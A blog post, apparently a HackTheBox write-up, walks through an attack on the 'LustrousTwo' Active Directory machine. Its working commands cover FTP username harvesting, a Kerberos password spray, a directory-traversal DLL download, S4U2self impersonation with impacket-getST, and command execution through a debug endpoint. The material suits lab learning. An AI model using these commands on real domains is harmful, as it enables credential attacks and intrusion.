---
title: "LustrousTwo"
date: 2026-11-21 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, hard, active-directory, kerberos, ftp, kerberoasting, s4u2self, directory-traversal, dotnet]
image:
    path: /assets/Images/lustroustwo-005_foothold_debug-rce.png
    alt: LustrousTwo
description: "LustrousTwo is a hard Windows Active Directory machine running Kerberos-only (NTLM disabled). An anonymous FTP server leaks the AD username list, a Kerberos password spray gives a foothold account, and a directory-traversal leak of the web app's DLL reveals a ShareAdmins-only PowerShell endpoint reached by abusing Kerberos S4U2self. This post covers recon through code execution as the web service account."
---

## Overview

LustrousTwo is a hard-difficulty Windows AD box built around a Kerberos-only domain (NTLM disabled, LDAP signing + channel binding). Anonymous FTP leaks the user list; a Kerberos spray lands a foothold account; a directory-traversal download of the website's `.dll` reveals a hidden PowerShell-exec endpoint restricted to a `ShareAdmins` group, which is reached by abusing Kerberos S4U2self to impersonate a member — giving code execution as the web service account.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | anonymous login |
| 53/88/389/636/3268 | DNS / Kerberos / LDAP | Domain Controller |
| 80 | HTTP | LuShare app, Kerberos (Negotiate) auth |
| 139/445 | SMB | — |
| 464/593/5985 | kpasswd / epmap / WinRM | — |

```bash
nmap -Pn -sC -sV 10.129.242.166
```

Domain `Lustrous2.vl`, DC `LUS2DC`. The web app requires Kerberos auth — so the first job is to get a domain account.

## Enumeration

Anonymous FTP exposes a `/Homes/` folder with one directory per AD user — an instant, accurate username list:

```bash
curl -s "ftp://anonymous:@10.129.242.166/Homes/" | awk '{print $NF}' > users.txt   # ~71 usernames
```

A single-password Kerberos spray finds a valid account:

```bash
kerbrute passwordspray -d lustrous2.vl --dc lus2dc.lustrous2.vl users.txt 'Lustrous2024'
# -> Thomas.Myers:Lustrous2024
```

![kerberos spray](/assets/Images/lustroustwo-003_enum_signal-kerb-spray.png)

With a `krb5.conf` (realm `LUSTROUS2.VL`, `kdc = <ip>`) we `kinit` and reach the site over Kerberos — using `curl --resolve` so no `/etc/hosts` edit is needed:

```bash
KRB5_CONFIG=krb5.conf kinit thomas.myers
curl -s --negotiate -u : --resolve lus2dc.lustrous2.vl:80:10.129.242.166 http://lus2dc.lustrous2.vl/
```

## Foothold

The site has a directory-traversal download. Pulling its own DLL and reversing it (with `monodis`) reveals a `ShareAdmins`-only `/File/Debug` endpoint that runs PowerShell behind a hardcoded PIN:

```bash
curl -s --negotiate -u : --resolve lus2dc.lustrous2.vl:80:10.129.242.166 \
  "http://lus2dc.lustrous2.vl/File/Download?fileName=../../LuShare.dll" -o LuShare.dll
monodis LuShare.dll   # -> /File/Debug, hardcoded PIN, ShareAdmins
```

We don't have a ShareAdmins password — but Kerberos S4U2self lets a service account that owns an SPN (`ShareSvc`, whose secret was recovered) request a ticket to itself impersonating any user, and `-altservice` rewrites it to the website's `HTTP/` SPN:

```bash
impacket-getST -self -impersonate ryan.davies -altservice HTTP/lus2dc.lustrous2.vl \
  -k 'LUSTROUS2.VL/ShareSvc:<redacted>' -dc-ip 10.129.242.166
```

![s4u2self impersonation](/assets/Images/lustroustwo-004_exploit_s4u2self-ryan.png)

Presenting that ticket authenticates to the site as `ryan.davies` (a ShareAdmin). The Debug endpoint uses an ASP.NET antiforgery token, so we GET the form with a cookie jar, scrape the token, then POST our command + PIN:

```bash
export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
curl -s -c cj --negotiate -u : --resolve lus2dc.lustrous2.vl:80:10.129.242.166 "http://lus2dc.lustrous2.vl/File/Debug" -o f.html
TOK=$(grep -oP 'RequestVerificationToken\D+value="\K[^"]+' f.html)
curl -s -b cj --negotiate -u : --resolve lus2dc.lustrous2.vl:80:10.129.242.166 -X POST "http://lus2dc.lustrous2.vl/File/Debug" \
  --data-urlencode "command=whoami" --data-urlencode "pin=<redacted>" --data-urlencode "__RequestVerificationToken=$TOK"
# -> lustrous2\sharesvc
```

![debug rce](/assets/Images/lustroustwo-005_foothold_debug-rce.png)

We now have command execution as the web service account `lustrous2\sharesvc`.

## User flag

On LustrousTwo the user flag is stored in a SYSTEM-readable location, so reading it requires the privilege-escalation step (a Velociraptor server abuse) that is beyond this post's recon→foothold scope.

```bash
# reached only after the (omitted) local privilege escalation to SYSTEM
type C:\user.txt   # HTB{...}
```

> Foothold complete: code execution as `sharesvc` via the Kerberos S4U2self → Debug-endpoint chain. The Velociraptor SYSTEM escalation is left as an exercise — this post stops at the foothold.
